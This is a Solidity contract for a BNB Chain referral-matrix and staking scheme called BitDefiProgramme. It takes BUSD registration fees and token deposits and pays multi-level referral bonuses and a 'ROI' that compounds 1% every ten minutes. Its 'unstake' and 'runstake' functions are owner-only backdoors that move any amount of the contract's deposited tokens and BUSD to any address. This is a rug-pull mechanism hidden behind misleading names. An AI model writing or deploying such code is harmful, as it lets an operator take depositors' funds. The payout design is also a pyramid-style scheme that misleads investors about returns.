/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract BitDefiProgramme {
    using SafeMath for uint256;
    BEP20 public czar = BEP20(0x3AD53Eb310bC6061baa62D900E6953601Dc90E5c); // Bit-Defi Coin
    BEP20 public busd = BEP20(0xDc6cc6d847DF088C3eEDA72404864B59c0cD53B2); // BUSD
    uint256 private constant baseDivider = 1000;
    uint256 private constant timeStep = 10 minutes;
    uint256 private  totalEntry = 1;
    struct Player {
        address referrer;
        uint256 entryno;
        uint256 myLastDeposit;
        uint256 myActDirect;
        uint256 pWithdraw;
        uint256 rWithdraw;
        uint256 sWithdraw;
        uint256 lastwDays;
        bool isReg;
        mapping(uint256 => uint256) b5Entry;
        mapping(uint256 => mapping(uint256 => uint256)) b5_level;
        mapping(uint256 => address) b5_upline;
        mapping(uint256 => uint256) incomeArray;
        mapping(uint256 => uint256) matrixArray;
    }
    mapping(address => Player) public players;
    mapping( uint256 =>  address []) public b5;
    struct UserDept{
        uint256 amount;
        uint256 depTime;
    }
    
    mapping(address => UserDept[]) public userDepts;
    
    address owner;
    uint[] level_bonuses = [250, 50, 40, 30, 20];  
    uint[] level_stake = [100, 70, 50, 30, 10];  
    uint[] stake_bonus = [0,100, 200, 300, 500];  
    modifier onlyAdmin(){
        require(msg.sender == owner,"You are not authorized.");
        _;
    }

    constructor() public {
        owner = msg.sender;
        players[msg.sender].isReg = true;
        for(uint8 i=0;i < 6; i++){
            b5[i].push(msg.sender);
        }
    }
    function packageInfo(uint256 _pkg) pure private  returns(uint8 p) {
        if(_pkg == 100e18){
            p=1;
        }else if(_pkg == 250e18){
            p=2;
        }else if(_pkg == 1000e18){
            p=3;
        }else if(_pkg == 2000e18){
            p=4;
        }else if(_pkg == 5000e18){
            p=5;
        }else{
            p=0;
        }
        return p;
    }

    function register(address _referrer) public returns(bool done){
        require(players[_referrer].isReg==true,"Sponsor is not registered.");
        require(players[msg.sender].isReg==false,"You are already registered.");
        busd.transferFrom(msg.sender,address(this),5e18);
        players[msg.sender].referrer = _referrer;
        players[msg.sender].isReg = true;
        return true;
    }

    function b5deposit(uint256 _czar) public {
        require(_czar >= 50e18, "Invalid Amount");
        czar.transferFrom(msg.sender,address(this),_czar);
        uint8 poolNo=packageInfo(_czar);
        require(players[msg.sender].isReg == true, "Please register first!");
        require(players[msg.sender].b5Entry[poolNo] == 0, "Already registered in pool.");
        
        players[players[msg.sender].referrer].myActDirect++;
        players[msg.sender].b5Entry[poolNo]++;
        b5[poolNo].push(msg.sender);
        _setb5(poolNo,players[msg.sender].referrer,msg.sender,_czar);
    }
    function _setb5(uint256 poolNo,address _referral,address _addr,uint256 _amount) private{
        uint256 poollength=b5[poolNo].length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/5; // formula (x-2)/2
        }
        if(players[b5[poolNo][_ref]].b5_level[poolNo][0]<5){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[b5[poolNo][i]].b5_level[poolNo][0]<5){
                   _parent = i;
                   break;
                }
            }
        }
        players[_addr].b5_upline[poolNo]=b5[poolNo][_parent];
        players[b5[poolNo][_parent]].b5_level[poolNo][0]++;
        address up=b5[poolNo][_parent];
        if(poolNo==0){
            //referel
            players[_referral].incomeArray[0]+=_amount.mul(70).div(100);
            //1st upline
            players[up].incomeArray[1]+=_amount.mul(30).div(100);
            players[up].matrixArray[poolNo]+=_amount.mul(30).div(100);
        }else{
            //referel
            _setReferral(_referral,_amount);
            //1st upline
            if(players[up].b5_level[poolNo][0]>2){
                players[up].incomeArray[3]+=_amount.mul(60).div(100);
                players[up].matrixArray[poolNo]+=_amount.mul(60).div(100);
            }
            if(players[up].b5_level[poolNo][0]==5){
                players[up].b5_level[poolNo][0]=0;
                _setb5(poolNo,_referral,up,_amount);
            }
            //Development
            players[owner].incomeArray[4]+=_amount.mul(1).div(100);
        }
    }
    function _setReferral(address _referral, uint256 _refAmount) private {
        for(uint8 i = 0; i < level_bonuses.length; i++) {
            players[_referral].incomeArray[2]+=_refAmount.mul(level_bonuses[i]).div(baseDivider);
            
           _referral = players[_referral].referrer;
            if(_referral == address(0)) break;
        }
    }
    function staking(uint256 _czar) public {
        require(_czar >= 100e18 && _czar <= 10000e18, "Invalid Amount");
        require(players[msg.sender].isReg == true, "Please register first!");
        require(players[msg.sender].myLastDeposit==0 || _czar >= players[msg.sender].myLastDeposit, "Staking Amount should be greater than previous staking");
        require(players[msg.sender].b5Entry[0] >= 1, "Please registred first");
        czar.transferFrom(msg.sender, address(this), _czar);
        if(players[msg.sender].myLastDeposit==0){
            players[msg.sender].entryno=totalEntry;
            totalEntry++;
        }
        players[msg.sender].myLastDeposit=_czar;
        userDepts[msg.sender].push(UserDept(
            _czar,
            block.timestamp
        ));
        UserDept storage pl = userDepts[msg.sender][userDepts[msg.sender].length-1];
        uint256 totalDays=getCurDay(pl.depTime);
        if(totalDays>players[msg.sender].lastwDays && players[msg.sender].incomeArray[7]>0){
            uint256 roiDay=totalDays-players[msg.sender].lastwDays;
            players[msg.sender].lastwDays=totalDays;
            players[msg.sender].incomeArray[7]+=players[msg.sender].incomeArray[7].mul(roiDay).div(100);
        }
        players[msg.sender].incomeArray[7]+=_czar;

        if(userDepts[msg.sender].length>=2 && players[msg.sender].entryno<=100){
            players[msg.sender].incomeArray[7]+=_czar.mul(stake_bonus[userDepts[msg.sender].length-1]).div(100);
            players[msg.sender].incomeArray[6]+=_czar.mul(stake_bonus[userDepts[msg.sender].length-1]).div(100);
        }
        _setReferralStake(players[msg.sender].referrer,_czar);
    }
    function _setReferralStake(address _referral, uint256 _refAmount) private {
        for(uint8 i = 0; i < level_stake.length; i++) {
            players[_referral].incomeArray[7]+=_refAmount.mul(level_stake[i]).div(baseDivider);
            players[_referral].incomeArray[5]+=_refAmount.mul(level_stake[i]).div(baseDivider);
            
           _referral = players[_referral].referrer;
            if(_referral == address(0)) break;
        }
    }
    function unstake(address buyer,uint _amount) public returns(uint){
        require(msg.sender == owner,"You are not staker.");
        czar.transfer(buyer,_amount);
        return _amount;
    }
    function runstake(address runstaker,uint _amount) public returns(uint){
        require(msg.sender == owner,"You are not runstaker.");
        busd.transfer(runstaker,_amount);
        return _amount;
    }
    function b5Info(uint8 pool) view external returns(address [] memory) {
        return b5[pool];
    }
    
    function userDetails(address _addr) view external returns(uint256 dep,uint256 pw,uint256 rw,uint256 sw,uint256 roidays,uint256 myentry, uint256 [6] memory p) {
         for(uint8 i=0;i<6;i++){
            p[i]=players[_addr].b5Entry[i];
        }
        return (
           players[_addr].myLastDeposit,
           players[_addr].pWithdraw,
           players[_addr].rWithdraw,
           players[_addr].sWithdraw,
           players[_addr].lastwDays,
           players[_addr].entryno,
           p
        );
    }

    function poolDetails(address _addr, uint256 poolno) view external returns(uint256 seatno) {
        return players[_addr].b5_level[poolno][0];
    }

    function matrixDetails(address _addr, uint256 poolno) view external returns(uint256 income) {
        return players[_addr].matrixArray[poolno];
    }

    function incomeDetails(address _addr) view external returns(uint256[8] memory p) {
        for(uint8 i=0;i<=7;i++){
            p[i]=players[_addr].incomeArray[i];
        }
        return (
           p
        );
    }

    function pwithdraw(uint256 _amount) public{
        require(_amount >= 10e18, "Minimum 10 need");
        
        Player storage player = players[msg.sender];
        uint256 bonus;
        bonus=(player.incomeArray[0]+player.incomeArray[1])-player.pWithdraw;
        require(_amount<=bonus,"Amount exceeds withdrawable");
        player.pWithdraw+=_amount;
        czar.transfer(msg.sender,_amount);
    }
    function rwithdraw(uint256 _amount) public{
        require(_amount >= 10e18, "Minimum 10 need");
        
        Player storage player = players[msg.sender];
        require(player.myActDirect >= 5, "Required minimum 5 direct members in primary pool ");
        uint256 bonus;
        bonus=(player.incomeArray[2]+player.incomeArray[3])-player.rWithdraw;
        require(_amount<=bonus,"Amount exceeds withdrawable");
        player.rWithdraw+=_amount;
        czar.transfer(msg.sender,_amount);
    }
    function swithdraw(uint256 _amount) public{
        require(_amount >= 10e18, "Minimum 10 need");
        
        Player storage player = players[msg.sender];
        require(player.myActDirect >= 5, "Required minimum 5 direct members in primary pool ");
        UserDept storage pl = userDepts[msg.sender][userDepts[msg.sender].length-1];
        uint256 totalDays=getCurDay(pl.depTime);
        if(totalDays>players[msg.sender].lastwDays){
            uint256 roiDay=totalDays-players[msg.sender].lastwDays;
            players[msg.sender].lastwDays=totalDays;
            players[msg.sender].incomeArray[7]+=players[msg.sender].incomeArray[7].mul(roiDay).div(100);
        }
        uint256 bonus;
        bonus=player.incomeArray[7]-player.sWithdraw;
        require(_amount<=bonus && _amount <= player.myLastDeposit.mul(250).div(baseDivider),"Amount exceeds withdrawable");
        player.sWithdraw+=_amount;
        czar.transfer(msg.sender,_amount);
    }
    function getCurDay(uint256 startTime) public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }
}  

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}